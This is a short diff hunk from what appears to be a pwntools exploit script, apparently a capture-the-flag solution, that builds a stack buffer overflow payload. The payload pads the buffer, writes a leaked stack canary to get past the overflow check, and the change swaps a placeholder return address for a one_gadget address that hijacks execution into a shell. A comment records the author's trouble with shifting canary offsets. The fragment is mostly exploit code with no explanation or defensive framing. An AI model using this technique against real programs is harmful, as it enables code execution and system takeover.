@@ -71,8 +71,8 @@ offset = 24
 payload = offset*b'A'
 payload += p64(canary)
 payload += 8*b'A'
-#payload += p64(one_gadget)
-payload += 8*b'B'
+payload += p64(one_gadget)
+#payload += 8*b'B'
 
 #1 -> 1 works, but 1 -> 2 -> 1 doesn't work?? the canary offsets more 32 bytes...
 for i in range(9):
